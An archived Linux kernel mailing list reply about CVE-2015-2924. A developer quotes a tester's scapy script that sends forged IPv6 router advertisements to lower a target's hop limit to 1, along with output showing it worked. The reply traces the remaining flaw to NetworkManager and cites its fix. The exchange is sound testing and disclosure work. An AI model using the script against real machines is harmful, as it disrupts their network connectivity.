From: "D.S. Ljungmark" <ljungmark@modio.se>
Subject: Re: [GIT] Networking
Date: Wed, 29 Apr 2015 17:17:25 +0200
Message-ID: <5540F605.2040907@modio.se>
References: <20150401.154847.612566794393812348.davem@davemloft.net> <CAK1hOcOd=dLUyxJy1mEj2=Hy-zOqDp2KJ8or+1Zrsk+BvNn5oQ@mail.gmail.com>
Mime-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha1;
 protocol="application/pgp-signature";
 boundary="VxPRUAjgTWsMl8eOH1AgBiH69dAHTkWSO"
Cc: Linus Torvalds <torvalds@linux-foundation.org>,
	Andrew Morton <akpm@linux-foundation.org>,
	netdev@vger.kernel.org,
	Linux Kernel Mailing List <linux-kernel@vger.kernel.org>,
	Hannes Frederic Sowa <hannes@stressinduktion.org>,
	Don Howard <dhoward@redhat.com>
To: Denys Vlasenko <vda.linux@googlemail.com>,
	David Miller <davem@davemloft.net>
Return-path: <netdev-owner@vger.kernel.org>
Received: from mail-la0-f49.google.com ([209.85.215.49]:33833 "EHLO
	mail-la0-f49.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S933196AbbD2PRa (ORCPT
	<rfc822;netdev@vger.kernel.org>); Wed, 29 Apr 2015 11:17:30 -0400
Received: by laat2 with SMTP id t2so22664122laa.1
        for <netdev@vger.kernel.org>; Wed, 29 Apr 2015 08:17:28 -0700 (PDT)
In-Reply-To: <CAK1hOcOd=dLUyxJy1mEj2=Hy-zOqDp2KJ8or+1Zrsk+BvNn5oQ@mail.gmail.com>
Sender: netdev-owner@vger.kernel.org
List-ID: <netdev.vger.kernel.org>

This is an OpenPGP/MIME signed message (RFC 4880 and 3156)
--VxPRUAjgTWsMl8eOH1AgBiH69dAHTkWSO
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable


On 29/04/15 16:51, Denys Vlasenko wrote:
> On Wed, Apr 1, 2015 at 9:48 PM, David Miller <davem@davemloft.net> wrot=
e:
>> D.S. Ljungmark (1):
>>       ipv6: Don't reduce hop limit for an interface
>=20
> https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/=
?id=3D6fd99094de2b83d1d4c8457f2c83483b2828e75a
>=20
> I was testing this change and apparently it doesn't close the hole.
>=20
> The python script I use to send RAs:
>=20
> #!/usr/bin/env python
> import sys
> import time
> import scapy.all
> from scapy.layers.inet6 import *
> ip =3D IPv6()
> # ip.dst =3D 'ff02::1'
> ip.dst =3D sys.argv[1]
> icmp =3D ICMPv6ND_RA()
> icmp.chlim =3D 1
> for x in range(10):
>     send(ip/icmp)
>     time.sleep(1)
>=20
> # ./ipv6-hop-limit.py fe80::21e:37ff:fed0:5006
> .
> Sent 1 packets.
> ...<10 times>...
> Sent 1 packets.
>=20
> After I do this, on the targeted machine I check hop_limits:
>=20
> # for f in /proc/sys/net/ipv6/conf/*/hop_limit; do echo -n $f:; cat $f;=
 done
> /proc/sys/net/ipv6/conf/all/hop_limit:64
> /proc/sys/net/ipv6/conf/default/hop_limit:64
> /proc/sys/net/ipv6/conf/enp0s25/hop_limit:1  <=3D=3D=3D THIS
> /proc/sys/net/ipv6/conf/lo/hop_limit:64
> /proc/sys/net/ipv6/conf/wlp3s0/hop_limit:64
>=20
> As you see, the interface which received RAs still lowered
> its hop_limit to 1. I take it means that the bug is still present
> (right? I'm not a network guy...).

It might not be present in the _kernel_. Do you run NetworkManager on
your system? If so, see below.

>=20
> I triple-checked that I do run the kernel with the fix.
> Further investigation shows that the code touched by the fix
> is not even reached, hop_limit is changed elsewhere.
>=20
> I'm willing to test additional patches.

NetworkManager had it's own re-implementation of the bug. It got fixed
with NetworkManager commit:

commit bdaaf9849b0cacf131b71fa2ae168f5db796874f
Author: Thomas Haller <thaller@redhat.com>
Date:   Wed Apr 8 15:54:30 2015 +0200

    platform: don't accept lowering IPv6 hop-limit from RA (CVE-2015-2924=
)



Beforte that commit, NetworkManager would take the RA packet, extract
the hop limit, and write it to the sysctl itself.




//D.S.



--=20
8362 CB14 98AD 11EF CEB6  FA81 FCC3 7674 449E 3CFC


--VxPRUAjgTWsMl8eOH1AgBiH69dAHTkWSO
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBAgAGBQJVQPYFAAoJEPzDdnREnjz8vFoQAMxz5tt9EoFyIXcFiiX1X3S9
X9yCKa08NilGSd9ZsHNTrnU+b1DVnIVaq9+mYunfXbWP+N0auw6K712JVzRgrN9B
RbxoNSHaAHqg+DSEwr/RrYu4VrV67UhfGSK7nDI4y14qS57XRK6Z6MfQe0hNth1c
HMAZTp0DacqHrNsr4qOEK/xeR78yUdOZZ0+vGTjChQlKkPYYaukjTgIdDQPTQJJZ
x8Fjkqc9wyCF7M0Z+nIIgPVj9VB8oY7xCHapty3cnkrJ/YeF4KYezuvXUTEOLJbo
Eddb8zjL2SxxKpxDb+ZMX98tpBU/I8Vi9TtpPbYTeAf/yNhHO7uQwbGRW7WVIy9b
v4uJUvJziHnHyF5mJ6BLJBzBnLqx6a6WxaJKA9OvkGS7s2KBSmDzvKKgL68v/MJV
EEEEDlZLFAv+4Fkk5YwOA3DfK8lNi13WZPfLd17BTD0XyiYe7pP1wS3EIRSze3uq
AIiev9TOlWT66BIklvVMbrZQZSj4BgoAigiW5/va7akhT3BVnbc41qVg7prTdXuJ
35jXBmzwB8iVP5l9eyi85QNFR5xYJysw7cT9cR9wdtVuJXEfGGVDzvPmxDQ0ryWB
FQec6XcJ/LKiHyB2xCc1X05X6vGJ558ivAkf4/+PUR+Je1H44elL1XL9NUXepv6J
ly+QXzgPDYY6RrHNnOLz
=QO8f
-----END PGP SIGNATURE-----

--VxPRUAjgTWsMl8eOH1AgBiH69dAHTkWSO--
